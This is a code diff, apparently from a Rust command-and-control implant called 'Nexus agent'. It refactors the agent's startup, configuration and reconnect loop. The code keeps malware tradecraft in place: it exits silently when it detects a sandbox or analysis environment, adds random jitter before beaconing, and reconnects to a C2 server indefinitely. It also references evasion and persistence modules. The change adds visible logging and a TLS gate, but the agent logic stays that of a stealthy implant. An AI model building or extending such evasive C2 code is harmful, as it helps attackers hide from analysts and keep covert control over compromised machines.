@@ -18,12 +18,14 @@ use std::sync::Arc;
 use std::time::Duration;
 use tokio::time::sleep;
 
+mod a2a_client;
 mod agent;
 mod communication;
 mod evasion;
 mod execution;
 mod persistence;
 mod registry;
+mod shell;
 mod system;
 
 #[cfg(target_os = "windows")]
@@ -82,56 +84,57 @@ fn main() {
 }
 
 async fn run_agent(args: Vec<String>) -> Result<()> {
-    // Initialize logging (in release mode, this should be minimal or disabled)
-    #[cfg(debug_assertions)]
-    env_logger::init();
+    // Always initialize tracing — the service needs visible logs.
+    tracing_subscriber::fmt()
+        .with_env_filter(
+            tracing_subscriber::EnvFilter::try_from_default_env()
+                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
+        )
+        .with_target(false)
+        .init();
 
-    // Perform environment checks for sandbox/analysis detection
     if EnvironmentChecker::is_analysis_environment().await {
-        // Exit silently if we detect analysis environment
         return Ok(());
     }
 
-    // Add initial jitter delay
     let jitter = rand::random::<u64>() % 30 + 10;
     sleep(Duration::from_secs(jitter)).await;
 
-    let server_addr = if args.len() > 1 {
-        args[1].clone()
-    } else {
-        // Default C2 server address (should be configured at build time)
-        "127.0.0.1:4444".to_string()
-    };
+    // Prefer NEXUS_SERVER_ADDR env var; fall back to first CLI arg.
+    let c2_addr = std::env::var("NEXUS_SERVER_ADDR").unwrap_or_else(|_| {
+        args.get(1)
+            .cloned()
+            .unwrap_or_else(|| "https://127.0.0.1:50052".to_string())
+    });
+    let tag = std::env::var("NEXUS_AGENT_TAG").unwrap_or_default();
+    // NEXUS_INSECURE_NETWORK bypasses the loopback gate without TLS — dev/test only.
+    // In production, set NEXUS_CA_CERT instead; that satisfies the gate via TLS.
+    let insecure_network = std::env::var("NEXUS_INSECURE_NETWORK").is_ok();
 
-    // Create encryption key (in production, this should be embedded or derived)
-    let encryption_key = [
-        0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32,
-        0x10, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54,
-        0x32, 0x10,
-    ];
+    let cfg = a2a_client::A2aClientConfig { c2_addr, tag, insecure_network };
 
-    // Initialize the agent
-    let mut agent = NexusAgent::new(server_addr, encryption_key).await?;
+    let identity_path = std::env::var("NEXUS_IDENTITY_PATH")
+        .unwrap_or_else(|_| "/var/lib/nexus-agent/identity.bin".to_string());
+    let identity = NodeIdentity::load_or_create(std::path::Path::new(&identity_path))?;
+    tracing::info!(peer_id = %hex_peer_id(identity.peer_id()), "identity loaded");
 
-    // Main agent loop with error recovery
     loop {
-        match agent.run_cycle().await {
-            Ok(_) => {
-                // Successful cycle, add some jitter before next cycle
-                let cycle_delay = rand::random::<u64>() % 60 + 30; // 30-90 seconds
-                sleep(Duration::from_secs(cycle_delay)).await;
+        tracing::info!(addr = %cfg.c2_addr, "connecting to C2");
+        match a2a_client::connect_and_serve(&cfg, &identity, std::future::pending::<()>()).await {
+            Ok(()) => {
+                tracing::info!("C2 stream closed cleanly, reconnecting");
             }
             Err(e) => {
-                // Log error in debug mode, otherwise fail silently
-                #[cfg(debug_assertions)]
-                eprintln!("Agent cycle error: {}", e);
-
-                // Exponential backoff on errors
-                let error_delay = rand::random::<u64>() % 300 + 60; // 1-6 minutes
-                sleep(Duration::from_secs(error_delay)).await;
+                tracing::warn!("C2 connect error: {e}, backing off");
+                let delay = rand::random::<u64>() % 300 + 60;
+                sleep(Duration::from_secs(delay)).await;
             }
         }
     }
+}
+
+fn hex_peer_id(peer_id: [u8; 32]) -> String {
+    peer_id.iter().map(|b| format!("{b:02x}")).collect()
 }
 
 #[cfg(test)]
